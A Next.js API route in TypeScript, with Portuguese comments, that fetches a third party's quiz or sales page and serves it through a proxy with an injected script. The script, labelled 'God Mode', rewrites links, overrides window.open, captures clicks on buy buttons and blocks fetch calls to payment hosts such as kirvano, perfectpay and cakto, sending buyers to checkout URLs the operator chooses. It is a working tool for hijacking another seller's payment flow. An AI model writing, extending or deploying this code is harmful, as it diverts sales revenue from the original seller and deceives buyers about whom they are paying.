import { createClient } from '@supabase/supabase-js';
import { NextResponse } from 'next/server';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!
);

export async function GET(req: Request, { params }: { params: { id: string } }) {
  const { id } = params;

  const { data: quiz, error } = await supabase
    .from('quizzes')
    .select('*')
    .eq('id', id)
    .single();

  if (error || !quiz) {
    return new Response('Quiz não encontrado', { status: 404 });
  }

  try {
    const response = await fetch(quiz.original_url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      }
    });

    let html = await response.text();
    const targetBaseUrl = new URL(quiz.original_url).origin;

    // Script de Proteção Nuclear
    const interceptorScript = `
      <script>
      (function() {
        window.QUIZ_REPLACEMENTS = ${JSON.stringify(quiz.theme_config?.replacements || {})};
        
        function forceRedirect(url) {
          if (!url || typeof url !== 'string') return false;
          const replacements = window.QUIZ_REPLACEMENTS || {};
          const global = replacements['__CHECKOUT_URL__'];
          const specific = replacements[url];
          const final = specific || global;

          if (final && (url.includes('kirvano') || url.includes('pay.') || url.includes('checkout') || url.includes('perfectpay') || url.includes('cakto'))) {
            console.log("God Mode: Bloqueando e redirecionando para " + final);
            window.location.href = final;
            return true;
          }
          return false;
        }

        // 1. Limpeza Ativa de Links (MutationObserver)
        const observer = new MutationObserver(() => {
          document.querySelectorAll('a, button').forEach(el => {
            const href = el.getAttribute('href');
            if (href && (href.includes('kirvano') || href.includes('pay.') || href.includes('checkout'))) {
              const replacements = window.QUIZ_REPLACEMENTS || {};
              const final = replacements[href] || replacements['__CHECKOUT_URL__'];
              if (final) {
                el.setAttribute('href', final);
                el.onclick = (e) => { 
                  e.preventDefault(); 
                  e.stopPropagation();
                  window.location.href = final; 
                };
              }
            }
          });
        });
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // 2. Interceptar window.open
        const _open = window.open;
        window.open = function(url) {
          if (url && forceRedirect(url)) return null;
          return _open.apply(this, arguments);
        };

        // 3. Interceptar cliques globais (Capture Phase)
        document.addEventListener('click', (e) => {
          const target = e.target.closest('a, button, [role="button"]');
          if (target) {
            const href = target.getAttribute('href') || '';
            const text = target.textContent?.toLowerCase() || '';
            if (forceRedirect(href) || (text.includes('comprar') && forceRedirect('checkout'))) {
              e.preventDefault();
              e.stopPropagation();
            }
          }
        }, true);

        // 4. Interceptar Fetch/XHR
        const _fetch = window.fetch;
        window.fetch = function(u, c) {
          const url = typeof u === 'string' ? u : u?.url;
          if (url && (url.includes('kirvano') || url.includes('checkout'))) {
            forceRedirect(url);
            return new Promise(() => {});
          }
          return _fetch.apply(this, arguments);
        };
      })();
      </script>
    `;

    // Injetar no topo para prioridade máxima
    html = html.replace('<head>', '<head>' + interceptorScript);
    
    // Corrigir caminhos relativos
    html = html.replace(/(href|src|action)="\//g, `$1="${targetBaseUrl}/`);

    return new Response(html, {
      headers: { 'Content-Type': 'text/html' }
    });

  } catch (err) {
    return new Response('Erro ao carregar o quiz original', { status: 500 });
  }
}
